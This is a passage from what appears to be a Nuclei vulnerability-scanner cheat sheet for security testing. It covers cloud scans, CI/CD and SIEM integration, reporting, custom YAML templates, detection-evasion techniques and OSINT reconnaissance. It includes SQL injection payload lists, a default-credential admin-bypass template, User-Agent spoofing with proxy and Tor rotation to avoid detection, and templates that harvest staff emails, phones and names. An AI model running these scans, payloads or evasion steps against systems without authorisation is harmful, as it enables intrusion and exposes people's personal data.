enumeration\nnuclei -l cms_targets.txt -t technologies/cms/ -v\n\n# Plugin/module vulnerability scanning\nnuclei -l cms_sites.txt -t cves/ -tags plugin,module\n"})}),"\n",(0,s.jsx)(n.h2,{id:"7-cloud-security-assessment",children:"7. Cloud Security Assessment"}),"\n",(0,s.jsx)(n.p,{children:"Replace cloud service endpoints and credentials with your specific cloud environment details. Ensure proper IAM permissions and access controls are in place."}),"\n",(0,s.jsx)(n.h3,{id:"71-aws-security-configuration",children:"7.1 AWS Security Configuration"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# S3 bucket misconfiguration detection\nnuclei -l s3_urls.txt -t misconfigurations/aws/s3-bucket-misconfiguration.yaml\n\n# AWS service enumeration\nnuclei -l aws_endpoints.txt -t cloud/aws/ -severity info,low\n\n# ELB/ALB security assessment\nnuclei -l elb_endpoints.txt -t cloud/aws/elb-security.yaml\n\n# CloudFront misconfiguration detection\nnuclei -l cloudfront_urls.txt -t cloud/aws/cloudfront-misconfiguration.yaml\n\n# AWS metadata service testing\nnuclei -l ec2_instances.txt -t cloud/aws/metadata-service.yaml\n"})}),"\n",(0,s.jsx)(n.h3,{id:"72-azure-security-assessment",children:"7.2 Azure Security Assessment"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Azure storage account testing\nnuclei -l azure_storage.txt -t cloud/azure/storage-account.yaml\n\n# Azure AD configuration assessment\nnuclei -l azure_domains.txt -t cloud/azure/azure-ad.yaml\n\n# Azure App Service testing\nnuclei -l azure_apps.txt -t cloud/azure/app-service.yaml\n\n# Azure Key Vault enumeration\nnuclei -l azure_keyvaults.txt -t cloud/azure/key-vault.yaml\n"})}),"\n",(0,s.jsx)(n.h3,{id:"73-google-cloud-platform-testing",children:"7.3 Google Cloud Platform Testing"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# GCP storage bucket enumeration\nnuclei -l gcp_buckets.txt -t cloud/gcp/storage-bucket.yaml\n\n# Cloud Functions security testing\nnuclei -l gcp_functions.txt -t cloud/gcp/cloud-functions.yaml\n\n# App Engine misconfiguration detection\nnuclei -l gcp_apps.txt -t cloud/gcp/app-engine.yaml\n"})}),"\n",(0,s.jsx)(n.h2,{id:"8-integration-and-automation",children:"8. Integration and Automation"}),"\n",(0,s.jsx)(n.p,{children:"Replace CI/CD pipeline configurations and integration endpoints with your specific automation infrastructure details."}),"\n",(0,s.jsx)(n.h3,{id:"81-cicd-pipeline-integration",children:"8.1 CI/CD Pipeline Integration"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:"# GitHub Actions Workflow\nname: Security Scan\non: [push, pull_request]\njobs:\n  nuclei-scan:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n      - name: Run Nuclei Scanner\n        run: |\n          docker run --rm -v $(pwd):/workspace \\\n            projectdiscovery/nuclei:latest \\\n            -u ${{ github.event.repository.clone_url }} \\\n            -severity critical,high \\\n            -json -o /workspace/nuclei-results.json\n      - name: Upload Results\n        uses: actions/upload-artifact@v2\n        with:\n          name: nuclei-results\n          path: nuclei-results.json\n"})}),"\n",(0,s.jsx)(n.h3,{id:"82-jenkins-pipeline-integration",children:"8.2 Jenkins Pipeline Integration"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-groovy",children:"pipeline {\n    agent any\n    stages {\n        stage('Security Scan') {\n            steps {\n                script {\n                    sh '''\n                        nuclei -l targets.txt \\\n                        -severity critical,high,medium \\\n                        -json \\\n                        -output nuclei-results.json\n                    '''\n                }\n            }\n        }\n        stage('Process Results') {\n            steps {\n                archiveArtifacts artifacts: 'nuclei-results.json'\n                publishHTML([\n                    allowMissing: false,\n                    alwaysLinkToLastBuild: true,\n                    keepAll: true,\n                    reportDir: '.',\n                    reportFiles: 'nuclei-results.json',\n                    reportName: 'Nuclei Security Report'\n                ])\n            }\n        }\n    }\n}\n"})}),"\n",(0,s.jsx)(n.h3,{id:"83-api-integration-and-automation",children:"8.3 API Integration and Automation"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"# Python automation script\nimport subprocess\nimport json\nimport requests\n\ndef run_nuclei_scan(target, templates_dir):\n    \"\"\"Execute Nuclei scan and return results\"\"\"\n    cmd = [\n        'nuclei',\n        '-u', target,\n        '-t', templates_dir,\n        '-severity', 'critical,high,medium',\n        '-json',\n        '-silent'\n    ]\n    \n    result = subprocess.run(cmd, capture_output=True, text=True)\n    if result.stdout:\n        return [json.loads(line) for line in result.stdout.strip().split('\\n')]\n    return []\n\ndef process_results(results):\n    \"\"\"Process and filter scan results\"\"\"\n    critical_findings = []\n    for finding in results:\n        if finding.get('info', {}).get('severity') == 'critical':\n            critical_findings.append({\n                'template_id': finding.get('template-id'),\n                'name': finding.get('info', {}).get('name'),\n                'url': finding.get('matched-at'),\n                'severity': finding.get('info', {}).get('severity')\n            })\n    return critical_findings\n\ndef send_to_slack(findings):\n    \"\"\"Send critical findings to Slack\"\"\"\n    webhook_url = \"https://hooks.slack.com/services/YOUR/SLACK/WEBHOOK\"\n    message = f\"\ud83d\udea8 Critical Security Findings: {len(findings)} issues detected\"\n    requests.post(webhook_url, json={'text': message})\n\n# Usage example\nif __name__ == \"__main__\":\n    targets = ['https://example.com', 'https://api.example.com']\n    for target in targets:\n        results = run_nuclei_scan(target, 'cves/')\n        critical = process_results(results)\n        if critical:\n            send_to_slack(critical)\n"})}),"\n",(0,s.jsx)(n.h2,{id:"9-output-management-and-reporting",children:"9. Output Management and Reporting"}),"\n",(0,s.jsx)(n.p,{children:"Adjust output paths, report formats, and integration endpoints based on your reporting requirements and toolchain."}),"\n",(0,s.jsx)(n.h3,{id:"91-output-format-options",children:"9.1 Output Format Options"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# JSON output for programmatic processing\nnuclei -l targets.txt -json -o results.json\n\n# JSONL format for streaming processing\nnuclei -l targets.txt -jsonl -o results.jsonl\n\n# Markdown report generation\nnuclei -l targets.txt -markdown-export results.md\n\n# CSV output for spreadsheet analysis\nnuclei -l targets.txt -csv-export results.csv\n\n# SARIF format for security tools integration\nnuclei -l targets.txt -sarif-export results.sarif\n\n# Multiple output formats simultaneously\nnuclei -l targets.txt -json -jsonl -markdown-export report\n"})}),"\n",(0,s.jsx)(n.h3,{id:"92-custom-reporting-templates",children:"9.2 Custom Reporting Templates"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Custom HTML report template\nnuclei -l targets.txt -report-config report-config.yaml\n\n# Report configuration file (report-config.yaml)\ntemplate-name: "custom-security-report"\noutput-format: "html"\ninclude-metadata: true\nseverity-colors:\n  critical: "#FF0000"\n  high: "#FF4500"\n  medium: "#FFA500"\n  low: "#FFFF00"\n  info: "#0000FF"\n'})}),"\n",(0,s.jsx)(n.h3,{id:"93-result-filtering-and-processing",children:"9.3 Result Filtering and Processing"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Filter results by severity\nnuclei -l targets.txt -json | jq '.[] | select(.info.severity == \"critical\")'\n\n# Extract unique template IDs\nnuclei -l targets.txt -json | jq -r '.\"template-id\"' | sort | uniq\n\n# Count findings by severity\nnuclei -l targets.txt -json | jq -r '.info.severity' | sort | uniq -c\n\n# Filter by specific CVE\nnuclei -l targets.txt -json | jq '.[] | select(.info.classification.\"cve-id\")'\n\n# Extract all matched URLs\nnuclei -l targets.txt -json | jq -r '.\"matched-at\"' | sort | uniq\n"})}),"\n",(0,s.jsx)(n.h2,{id:"10-performance-optimization",children:"10. Performance Optimization"}),"\n",(0,s.jsx)(n.p,{children:"Configure rate limiting, timeout values, and resource allocation based on your network capacity and target infrastructure limitations."}),"\n",(0,s.jsx)(n.h3,{id:"101-rate-limiting-and-traffic-control",children:"10.1 Rate Limiting and Traffic Control"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Conservative scanning for production environments\nnuclei -l targets.txt -rate-limit 10 -bulk-size 5 -timeout 30\n\n# Aggressive scanning for internal testing\nnuclei -l targets.txt -rate-limit 500 -bulk-size 100 -timeout 5\n\n# Custom delay between requests\nnuclei -l targets.txt -rate-limit 50 -delay 100ms\n\n# Connection pooling optimization\nnuclei -l targets.txt -max-host-error 5 -retries 3\n\n# Memory usage optimization\nnuclei -l targets.txt -stream -bulk-size 25\n"})}),"\n",(0,s.jsx)(n.h3,{id:"102-distributed-scanning",children:"10.2 Distributed Scanning"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Split target list for distributed scanning\nsplit -l 1000 targets.txt target_chunk_\n\n# Parallel execution across multiple hosts\n# Host 1\nnuclei -l target_chunk_aa -o results_host1.json &\n\n# Host 2  \nnuclei -l target_chunk_ab -o results_host2.json &\n\n# Host 3\nnuclei -l target_chunk_ac -o results_host3.json &\n\n# Merge results\ncat results_host*.json > combined_results.json\n"})}),"\n",(0,s.jsx)(n.h3,{id:"103-resource-monitoring",children:"10.3 Resource Monitoring"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Monitor Nuclei resource usage\ntop -p $(pgrep nuclei)\n\n# Track network connections\nnetstat -an | grep :80 | wc -l\n\n# Monitor disk space for output files\ndf -h /path/to/output/directory\n\n# Memory usage tracking\nps aux | grep nuclei | awk '{print $6}'\n"})}),"\n",(0,s.jsx)(n.h2,{id:"11-evasion-and-stealth-techniques",children:"11. Evasion and Stealth Techniques"}),"\n",(0,s.jsx)(n.p,{children:"Implement evasion techniques responsibly and only within authorized testing environments. Monitor defensive systems for detection during testing."}),"\n",(0,s.jsx)(n.h3,{id:"111-request-modification-and-obfuscation",children:"11.1 Request Modification and Obfuscation"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Custom User-Agent rotation\nnuclei -l targets.txt -header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"\n\n# Random header injection\nnuclei -l targets.txt -header "X-Forwarded-For: 127.0.0.1" -header "X-Real-IP: 192.168.1.1"\n\n# Request method variation\nnuclei -l targets.txt -http-proxy http://proxy:8080\n\n# Cookie-based session management\nnuclei -l targets.txt -header "Cookie: session=abc123; auth=token456"\n\n# Custom referrer headers\nnuclei -l targets.txt -header "Referer: https://legitimate-site.com"\n'})}),"\n",(0,s.jsx)(n.h3,{id:"112-traffic-pattern-modification",children:"11.2 Traffic Pattern Modification"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:'# Stealth scanning template\nid: stealth-scan-example\n\ninfo:\n  name: Stealth Web Application Scan\n  author: security-team\n  severity: info\n  description: Low-profile scanning with evasion techniques\n\nhttp:\n  - method: GET\n    path:\n      - "{{BaseURL}}/robots.txt"\n      - "{{BaseURL}}/sitemap.xml"\n    \n    headers:\n      User-Agent: "Mozilla/5.0 (compatible; Googlebot/2.1)"\n      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"\n      Accept-Language: "en-US,en;q=0.5"\n      Accept-Encoding: "gzip, deflate"\n      DNT: "1"\n      Connection: "keep-alive"\n      Upgrade-Insecure-Requests: "1"\n    \n    attack: batteringram\n    threads: 1\n    delay: "5s"\n    \n    matchers:\n      - type: status\n        status:\n          - 200\n'})}),"\n",(0,s.jsx)(n.h3,{id:"113-proxy-chain-implementation",children:"11.3 Proxy Chain Implementation"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Single proxy usage\nnuclei -l targets.txt -http-proxy http://proxy1:8080\n\n# SOCKS proxy support\nnuclei -l targets.txt -http-proxy socks5://proxy:1080\n\n# Proxy chain configuration\nnuclei -l targets.txt -http-proxy http://proxy1:8080 -header "X-Forwarded-For: proxy2_ip"\n\n# Tor network integration\nnuclei -l targets.txt -http-proxy socks5://127.0.0.1:9050\n\n# Custom proxy rotation script\n#!/bin/bash\nPROXIES=("proxy1:8080" "proxy2:8080" "proxy3:8080")\nfor proxy in "${PROXIES[@]}"; do\n    nuclei -l targets.txt -http-proxy http://$proxy -o results_$proxy.json\ndone\n'})}),"\n",(0,s.jsx)(n.h2,{id:"12-custom-template-development",children:"12. Custom Template Development"}),"\n",(0,s.jsx)(n.p,{children:"Ensure template logic is properly tested and validated before deployment. Follow YAML syntax guidelines and nuclei template specifications."}),"\n",(0,s.jsx)(n.h3,{id:"121-template-structure-and-components",children:"12.1 Template Structure and Components"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:'id: advanced-template-example\n\ninfo:\n  name: Advanced Vulnerability Detection Template\n  author: security-researcher\n  severity: high\n  description: Comprehensive template demonstrating advanced features\n  reference:\n    - https://example.com/vulnerability-disclosure\n    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\n  classification:\n    cve-id: CVE-2023-12345\n    cwe-id: CWE-89\n    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\n    cvss-score: 9.8\n  metadata:\n    shodan-query: "title:vulnerable application"\n    fofa-query: "title=\\"vulnerable app\\""\n  tags: cve,sqli,critical,injection\n\nvariables:\n  payloads:\n    - "\'"\n    - "1\' OR \'1\'=\'1-- -"\n    - "\'; WAITFOR DELAY \'00:00:05\'-- -"\n  endpoints:\n    - "/login"\n    - "/search"\n    - "/admin"\n\nhttp:\n  - method: POST\n    path:\n      - "{{BaseURL}}{{endpoints}}"\n    \n    headers:\n      Content-Type: "application/x-www-form-urlencoded"\n      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"\n    \n    body: |\n      username={{payloads}}&password=test\n    \n    attack: pitchfork\n    threads: 10\n    \n    matchers-condition: or\n    matchers:\n      - type: word\n        words:\n          - "SQL syntax"\n          - "mysql_fetch_array"\n          - "PostgreSQL query failed"\n          - "ORA-00933"\n        condition: or\n        case-insensitive: true\n      \n      - type: regex\n        regex:\n          - "(?i)(error|exception|stack trace)"\n      \n      - type: dsl\n        dsl:\n          - "contains(body, \'database error\')"\n          - "status_code == 500"\n        condition: or\n    \n    extractors:\n      - type: regex\n        regex:\n          - "Error: (.+)"\n        group: 1\n        internal: true\n      \n      - type: kval\n        kval:\n          - response_time\n'})}),"\n",(0,s.jsx)(n.h3,{id:"122-multi-step-template-implementation",children:"12.2 Multi-Step Template Implementation"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:'id: multi-step-authentication-bypass\n\ninfo:\n  name: Multi-Step Authentication Bypass\n  author: security-team\n  severity: high\n  description: Tests for authentication bypass through multi-step process\n  tags: auth-bypass,multi-step,session\n\nhttp:\n  - method: GET\n    path:\n      - "{{BaseURL}}/login"\n    \n    matchers:\n      - type: status\n        status:\n          - 200\n    \n    extractors:\n      - type: regex\n        name: csrf_token\n        regex:\n          - \'name="csrf_token" value="([^"]+)"\'\n        group: 1\n        internal: true\n\n  - method: POST\n    path:\n      - "{{BaseURL}}/login"\n    \n    headers:\n      Content-Type: "application/x-www-form-urlencoded"\n    \n    body: |\n      username=admin&password=admin&csrf_token={{csrf_token}}\n    \n    matchers:\n      - type: word\n        words:\n          - "Set-Cookie"\n    \n    extractors:\n      - type: kval\n        name: session_cookie\n        kval:\n          - set_cookie\n        internal: true\n\n  - method: GET\n    path:\n      - "{{BaseURL}}/admin"\n    \n    headers:\n      Cookie: "{{session_cookie}}"\n    \n    matchers:\n      - type: word\n        words:\n          - "admin panel"\n          - "dashboard"\n        condition: or\n      \n      - type: status\n        status:\n          - 200\n'})}),"\n",(0,s.jsx)(n.h3,{id:"123-protocol-specific-templates",children:"12.3 Protocol-Specific Templates"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:'# DNS Template Example\nid: dns-zone-transfer-detection\n\ninfo:\n  name: DNS Zone Transfer Detection\n  author: security-team\n  severity: medium\n  description: Detects DNS servers allowing zone transfers\n  tags: dns,zone-transfer,misconfiguration\n\ndns:\n  - name: "{{FQDN}}"\n    type: AXFR\n    class: inet\n    \n    matchers:\n      - type: word\n        words:\n          - "IN\\tSOA"\n          - "IN\\tNS"\n        condition: and\n\n# TCP Template Example  \nid: service-banner-grabbing\n\ninfo:\n  name: Service Banner Grabbing\n  author: security-team\n  severity: info\n  description: Grabs service banners for fingerprinting\n  tags: network,banner,fingerprint\n\ntcp:\n  - inputs:\n      - data: "\\r\\n"\n        read: 1024\n    host:\n      - "{{Hostname}}"\n    port:\n      - "21"\n      - "22"\n      - "23"\n      - "25"\n      - "80"\n      - "110"\n      - "143"\n      - "993"\n      - "995"\n    \n    matchers:\n      - type: regex\n        regex:\n          - "SSH-([0-9\\\\.]+)"\n          - "220 ([\\\\w\\\\s]+) FTP"\n          - "HTTP/1\\\\.[01] 200"\n'})}),"\n",(0,s.jsx)(n.h2,{id:"13-detection-and-defense-evasion",children:"13. Detection and Defense Evasion"}),"\n",(0,s.jsx)(n.p,{children:"Implement evasion strategies within ethical boundaries and authorized testing scope. Monitor and validate evasion effectiveness through defensive system analysis."}),"\n",(0,s.jsx)(n.h3,{id:"131-behavioral-pattern-modification",children:"13.1 Behavioral Pattern Modification"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Randomized scanning intervals\nnuclei -l targets.txt -delay "5s-30s" -rate-limit 5\n\n# Business hours scanning simulation\nnuclei -l targets.txt -delay "1h" -timeout 60\n\n# Geographic IP rotation\nnuclei -l targets.txt -http-proxy http://proxy-us:8080\nnuclei -l targets.txt -http-proxy http://proxy-eu:8080\nnuclei -l targets.txt -http-proxy http://proxy-asia:8080\n\n# Session persistence simulation\nnuclei -l targets.txt -header "Cookie: persistent_session=abc123"\n\n# Legitimate crawler simulation\nnuclei -l targets.txt -header "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)"\n'})}),"\n",(0,s.jsx)(n.h3,{id:"132-template-modification-for-stealth",children:"13.2 Template Modification for Stealth"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:'id: stealth-sqli-detection\n\ninfo:\n  name: Stealth SQL Injection Detection\n  author: security-team\n  severity: high\n  description: Low-profile SQL injection testing\n  tags: sqli,stealth,evasion\n\nvariables:\n  stealth_payloads:\n    - "admin\'/**/OR/**/\'1\'=\'1"\n    - "1\'/**/UNION/**/SELECT/**/1,2,3--"\n    - "\'; WAITFOR/**/DELAY/**/\'00:00:02\'--"\n\nhttp:\n  - method: GET\n    path:\n      - "{{BaseURL}}/search?q={{stealth_payloads}}"\n    \n    headers:\n      User-Agent: "Mozilla/5.0 (compatible; bingbot/2.0)"\n      Accept: "text/html,application/xhtml+xml"\n      Accept-Language: "en-US,en;q=0.9"\n      Cache-Control: "no-cache"\n      Pragma: "no-cache"\n    \n    attack: batteringram\n    threads: 1\n    delay: "10s-60s"\n    \n    matchers:\n      - type: dsl\n        dsl:\n          - "contains(body_words, \'error\') && duration >= 2000"\n        condition: and\n'})}),"\n",(0,s.jsx)(n.h3,{id:"133-advanced-evasion-techniques",children:"13.3 Advanced Evasion Techniques"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"# Python script for distributed scanning with evasion\nimport random\nimport time\nimport subprocess\nfrom concurrent.futures import ThreadPoolExecutor\n\nclass StealthScanner:\n    def __init__(self):\n        self.user_agents = [\n            \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\",\n            \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36\",\n            \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\"\n        ]\n        self.proxies = [\n            \"http://proxy1:8080\",\n            \"http://proxy2:8080\", \n            \"http://proxy3:8080\"\n        ]\n    \n    def randomized_scan(self, target):\n        \"\"\"Execute scan with randomized parameters\"\"\"\n        user_agent = random.choice(self.user_agents)\n        proxy = random.choice(self.proxies)\n        delay = random.randint(30, 300)  # 30s to 5min delay\n        \n        cmd = [\n            'nuclei',\n            '-u', target,\n            '-t', 'cves/',\n            '-header', f'User-Agent: {user_agent}',\n            '-http-proxy', proxy,\n            '-delay', f'{delay}s',\n            '-rate-limit', '1',\n            '-silent',\n            '-json'\n        ]\n        \n        return subprocess.run(cmd, capture_output=True, text=True)\n    \n    def distributed_scan(self, targets):\n        \"\"\"Execute distributed scanning across targets\"\"\"\n        with ThreadPoolExecutor(max_workers=3) as executor:\n            futures = []\n            for target in targets:\n                # Random delay before starting each scan\n                time.sleep(random.randint(60, 600))\n                future = executor.submit(self.randomized_scan, target)\n                futures.append(future)\n            \n            results = []\n            for future in futures:\n                result = future.result()\n                if result.stdout:\n                    results.append(result.stdout)\n            \n            return results\n\n# Usage\nscanner = StealthScanner()\ntargets = ['https://example1.com', 'https://example2.com']\nresults = scanner.distributed_scan(targets)\n"})}),"\n",(0,s.jsx)(n.h2,{id:"14-integration-with-security-tools",children:"14. Integration with Security Tools"}),"\n",(0,s.jsx)(n.p,{children:"Replace tool configurations and API endpoints with your specific security toolchain details and credentials."}),"\n",(0,s.jsx)(n.h3,{id:"141-siem-integration",children:"14.1 SIEM Integration"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Splunk integration\nnuclei -l targets.txt -json | curl -X POST \\\n  -H "Authorization: Splunk your_token" \\\n  -H "Content-Type: application/json" \\\n  -d @- \\\n  "https://splunk.example.com:8088/services/collector"\n\n# ELK Stack integration\nnuclei -l targets.txt -jsonl | \\\n  filebeat -e -c filebeat.yml\n\n# QRadar integration\nnuclei -l targets.txt -json -o nuclei-results.json\ncurl -X POST \\\n  -H "SEC: your_token" \\\n  -H "Content-Type: application/json" \\\n  -d @nuclei-results.json \\\n  "https://qradar.example.com/api/siem/offenses"\n'})}),"\n",(0,s.jsx)(n.h3,{id:"142-vulnerability-management-integration",children:"14.2 Vulnerability Management Integration"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"# DefectDojo integration\nimport requests\nimport json\n\ndef upload_to_defectdojo(results_file, engagement_id):\n    \"\"\"Upload Nuclei results to DefectDojo\"\"\"\n    url = \"https://defectdojo.example.com/api/v2/import-scan/\"\n    \n    headers = {\n        \"Authorization\": \"Token your_defectdojo_token\"\n    }\n    \n    files = {\n        'file': open(results_file, 'rb'),\n    }\n    \n    data = {\n        'scan_type': 'Nuclei Scan',\n        'engagement': engagement_id,\n        'active': True,\n        'verified': True,\n    }\n    \n    response = requests.post(url, headers=headers, files=files, data=data)\n    return response.json()\n\n# Usage\nresults = upload_to_defectdojo('nuclei-results.json', 123)\nprint(f\"Uploaded scan with ID: {results['id']}\")\n"})}),"\n",(0,s.jsx)(n.h3,{id:"143-ticketing-system-integration",children:"14.3 Ticketing System Integration"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"# Jira integration for vulnerability tracking\nfrom jira import JIRA\nimport json\n\ndef create_jira_tickets(nuclei_results):\n    \"\"\"Create Jira tickets for critical findings\"\"\"\n    jira = JIRA(\n        server='https://company.atlassian.net',\n        basic_auth=('username', 'api_token')\n    )\n    \n    with open(nuclei_results, 'r') as f:\n        for line in f:\n            finding = json.loads(line)\n            if finding.get('info', {}).get('severity') == 'critical':\n                issue_dict = {\n                    'project': {'key': 'SEC'},\n                    'summary': f\"Critical Vulnerability: {finding['info']['name']}\",\n                    'description': f\"\"\"\n                    Template ID: {finding['template-id']}\n                    URL: {finding['matched-at']}\n                    Severity: {finding['info']['severity']}\n                    Description: {finding['info']['description']}\n                    \"\"\",\n                    'issuetype': {'name': 'Bug'},\n                    'priority': {'name': 'Critical'},\n                    'labels': ['security', 'nuclei', 'vulnerability']\n                }\n                \n                new_issue = jira.create_issue(fields=issue_dict)\n                print(f\"Created ticket: {new_issue.key}\")\n\n# Usage\ncreate_jira_tickets('nuclei-results.jsonl')\n"})}),"\n",(0,s.jsx)(n.h2,{id:"15-open-source-intelligence-osint-and-reconnaissance",children:"15. Open Source Intelligence (OSINT) and Reconnaissance"}),"\n",(0,s.jsx)(n.p,{children:"OSINT operations using Nuclei enable comprehensive target profiling through automated discovery of publicly available information. Replace target domains, IP ranges, and data sources with your specific reconnaissance targets."}),"\n",(0,s.jsx)(n.h3,{id:"151-passive-information-gathering",children:"15.1 Passive Information Gathering"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Comprehensive domain reconnaissance\nnuclei -l domains.txt -t exposures/ -t technologies/ -severity info,low\n\n# Technology stack fingerprinting\nnuclei -l targets.txt -t technologies/ -tags fingerprint,detect\n\n# Subdomain discovery through DNS enumeration\nnuclei -l root_domains.txt -t dns/dns-brute.yaml -v\n\n# SSL certificate transparency logs\nnuclei -l domains.txt -t ssl/certificate-transparency.yaml\n\n# Search engine reconnaissance\nnuclei -l targets.txt -t exposures/configs/google-dorking.yaml\n"})}),"\n",(0,s.jsx)(n.h3,{id:"152-exposed-information-discovery",children:"15.2 Exposed Information Discovery"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Sensitive file exposure detection\nnuclei -l targets.txt -t exposures/files/ -tags backup,config,log\n\n# Backup and archive file discovery\nnuclei -l webapps.txt -t exposures/backups/ -severity medium,high\n\n# Configuration file exposure\nnuclei -l targets.txt -t exposures/configs/ -tags aws,git,env\n\n# API documentation exposure\nnuclei -l api_targets.txt -t exposures/apis/ -tags swagger,graphql,api-docs\n\n# Database exposure detection\nnuclei -l targets.txt -t exposures/configs/database-exposure.yaml\n"})}),"\n",(0,s.jsx)(n.h3,{id:"153-social-media-and-public-platform-reconnaissance",children:"15.3 Social Media and Public Platform Reconnaissance"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:'# Custom OSINT template for social media discovery\nid: social-media-reconnaissance\n\ninfo:\n  name: Social Media Platform Discovery\n  author: osint-team\n  severity: info\n  description: Discovers social media presence and public profiles\n  tags: osint,social-media,reconnaissance\n\nhttp:\n  - method: GET\n    path:\n      - "{{BaseURL}}/humans.txt"\n      - "{{BaseURL}}/team"\n      - "{{BaseURL}}/about"\n      - "{{BaseURL}}/contact"\n      - "{{BaseURL}}/staff"\n    \n    matchers:\n      - type: word\n        words:\n          - "twitter.com"\n          - "linkedin.com"\n          - "github.com"\n          - "facebook.com"\n          - "instagram.com"\n          - "@"\n        condition: or\n    \n    extractors:\n      - type: regex\n        regex:\n          - \'https?://(?:www\\.)?(?:twitter\\.com|linkedin\\.com|github\\.com|facebook\\.com|instagram\\.com)/[\\w\\.-]+\'\n          - \'[\\w\\.-]+@[\\w\\.-]+\\.\\w+\'\n        group: 0\n\n  - method: GET\n    path:\n      - "{{BaseURL}}/robots.txt"\n      - "{{BaseURL}}/sitemap.xml"\n    \n    extractors:\n      - type: regex\n        regex:\n          - \'https?://[^\\s<>"]+(?:linkedin|twitter|github|facebook|instagram)[^\\s<>"]*\'\n'})}),"\n",(0,s.jsx)(n.h3,{id:"154-metadata-and-document-intelligence",children:"15.4 Metadata and Document Intelligence"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Document metadata extraction\nnuclei -l document_urls.txt -t exposures/files/document-metadata.yaml\n\n# Image metadata analysis\nnuclei -l image_galleries.txt -t exposures/files/image-exif.yaml\n\n# PDF document intelligence\nnuclei -l pdf_locations.txt -t exposures/files/pdf-metadata.yaml\n\n# Office document exposure\nnuclei -l targets.txt -t exposures/files/ -tags office,document,metadata\n"})}),"\n",(0,s.jsx)(n.h3,{id:"155-advanced-osint-template-development",children:"15.5 Advanced OSINT Template Development"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:'id: comprehensive-osint-reconnaissance\n\ninfo:\n  name: Comprehensive OSINT Reconnaissance\n  author: osint-researchers\n  severity: info\n  description: Multi-vector OSINT data collection and analysis\n  tags: osint,reconnaissance,intelligence,profiling\n\nvariables:\n  osint_paths:\n    - "/humans.txt"\n    - "/security.txt"\n    - "/.well-known/security.txt"\n    - "/team.html"\n    - "/staff.php"\n    - "/about-us"\n    - "/company/team"\n    - "/our-team"\n  \n  social_platforms:\n    - "twitter.com"\n    - "linkedin.com"\n    - "github.com"\n    - "gitlab.com"\n    - "facebook.com"\n    - "instagram.com"\n    - "youtube.com"\n    - "medium.com"\n\nhttp:\n  - method: GET\n    path:\n      - "{{BaseURL}}{{osint_paths}}"\n    \n    matchers:\n      - type: status\n        status:\n          - 200\n    \n    extractors:\n      - type: regex\n        name: email_addresses\n        regex:\n          - \'[\\w\\.-]+@[\\w\\.-]+\\.\\w+\'\n        group: 0\n      \n      - type: regex\n        name: phone_numbers\n        regex:\n          - \'\\+?[\\d\\s\\-\\(\\)]{10,}\'\n        group: 0\n      \n      - type: regex\n        name: social_media\n        regex:\n          - \'https?://(?:www\\.)?(?:{{social_platforms}})/[\\w\\.-]+\'\n        group: 0\n      \n      - type: regex\n        name: names_titles\n        regex:\n          - \'(?i)(ceo|cto|ciso|director|manager|developer|engineer|admin|lead)\\s*:?\\s*([a-zA-Z\\s]+)\'\n        group: 2\n\n  - method: GET\n    path:\n      - "{{BaseURL}}/robots.txt"\n      - "{{BaseURL}}/sitemap.xml"\n      - 